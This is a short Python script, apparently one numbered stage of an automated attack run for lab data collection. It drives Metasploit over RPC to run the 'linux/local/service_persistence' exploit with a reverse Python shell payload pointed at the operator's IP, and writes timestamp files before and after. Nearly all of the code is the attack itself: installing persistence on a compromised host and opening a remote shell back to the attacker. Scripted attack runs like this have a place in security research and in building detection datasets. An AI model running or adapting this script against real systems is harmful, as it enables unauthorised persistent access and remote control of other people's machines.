import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    
    client = MsfRpcClient('kali')
    
    # start step 5
    output_time_file_start = 'time_step_4_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(120)
    
    try:
        exploit = client.modules.use('exploit', 'linux/local/service_persistence')
        payload = client.modules.use('payload', 'cmd/unix/reverse_python')
        exploit['SESSION'] = 1
        exploit['VERBOSE'] = True
        payload['LHOST'] = my_ip

        exploit.execute(payload=payload)


        client.sessions.session('1').stop()
        client.sessions.session('2').stop()
    
    except Exception as e:
        print(e)
        pass
    
    time.sleep(120)
    output_time_file_end = 'time_step_4_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(120)


main(sys.argv)
